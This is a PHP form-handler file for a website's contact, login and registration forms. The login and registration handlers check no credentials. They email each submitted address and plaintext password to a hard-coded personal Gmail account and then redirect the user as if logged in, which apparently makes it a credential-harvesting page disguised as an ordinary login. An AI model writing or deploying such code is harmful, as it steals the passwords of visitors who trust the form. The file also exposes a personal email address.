<?php
if (isset($_POST['manager'])) {

    $name = clearString($_POST['name'] ?? null);
    $email = clearString($_POST['email'] ?? null);
    $message = clearString($_POST['message'] ?? null);

    if (empty($name) || empty($email) || empty($message)) :
        setMessage('All fields is required', 'danger');
    else :
        $to = 'alkiddkv@gmail.com';
        $subject = 'Mail from site';
        $mess = "From: $name, Email: $email, Message: $message";

        if (mail($to, $subject, $mess)) {
            setMessage('Thanks, ' . $name);
        } else {
            setMessage('Sorry, try again later', 'danger');
        }
    endif;
    redirect('contacts');
}

if (isset($_POST['user'])) {

    $email = clearString($_POST['email'] ?? null);
    $password = clearString($_POST['password'] ?? null);

    if (empty($email) || empty($password)) :
        setMessage('All fields is required', 'danger');
    else :
        $to = 'alkiddkv@gmail.com';
        $subject = 'Login at site';
        $mess = "Login: Email: $email, Password: $password";

        if (mail($to, $subject, $mess)) {
            GetEmailLogin($email);
            redirect('home');
        } else {
            setMessage('Sorry, try again later', 'danger');
        }
    endif;
    redirect('login');
}

if (isset($_POST['newuser'])) {

    $email = clearString($_POST['email'] ?? null);
    $password = clearString($_POST['password'] ?? null);
    $confirmPassword = clearString($_POST['confirmPassword'] ?? null);

    if (empty($email) || empty($password) || empty($confirmPassword)) :
        setMessage('All fields is required', 'danger');
    elseif ($password != $confirmPassword) :
        setMessage('Passwods does not match', 'danger');
        setEmail($email);
    else :
        $to = 'alkiddkv@gmail.com';
        $subject = 'Login at site';
        $mess = "Login: Email: $email, Password: $password";

        if (mail($to, $subject, $mess)) {
            GetEmailLogin($email);
            redirect('home');
        } else {
            setMessage('Sorry, try again later', 'danger');
        }
    endif;
    redirect('register');
}
